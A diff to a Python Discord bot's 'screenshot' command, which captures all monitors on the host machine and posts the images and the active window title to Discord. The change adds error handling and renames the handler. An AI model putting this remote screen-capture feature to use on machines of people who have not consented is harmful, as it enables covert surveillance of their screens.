@@ -290,24 +290,30 @@ async def terms(ctx: discord.ApplicationContext, amount: int = 5):
 
 
 @bot.slash_command(name="screenshot", description="take a screenshot")
-async def ping(ctx: discord.ApplicationContext):
-    await ctx.defer()
+async def screenshot(ctx: discord.ApplicationContext):
+    try:
+        await ctx.defer()
 
-    files = []
+        files = []
 
-    with mss.mss() as sct:
-        for i, monitor in enumerate(sct.monitors[1:], start=1):
-            img = sct.grab(monitor)
-            image = Image.frombytes("RGB", img.size, img.rgb)
+        with mss.mss() as sct:
+            for i, monitor in enumerate(sct.monitors[1:], start=1):
+                img = sct.grab(monitor)
+                image = Image.frombytes("RGB", img.size, img.rgb)
 
-            buffer = io.BytesIO()
-            image.save(buffer, format="PNG")
-            buffer.seek(0)
+                buffer = io.BytesIO()
+                image.save(buffer, format="PNG")
+                buffer.seek(0)
 
-            file = discord.File(fp=buffer, filename=f"monitor_{i}.png")
-            files.append(file)
+                file = discord.File(fp=buffer, filename=f"monitor_{i}.png")
+                files.append(file)
 
-    await ctx.respond(content=pywinctl.getActiveWindowTitle(), files=files)
+        active_window = pywinctl.getActiveWindowTitle() or "No active window"
+        await ctx.respond(content=active_window, files=files)
+
+    except Exception as e:
+        await ctx.respond(f"❌ Error: `{str(e)}`", ephemeral=True)
+        raise  # Optional: re-raise for dev logs
 
 @bot.event
 async def on_application_command_error(ctx, error):
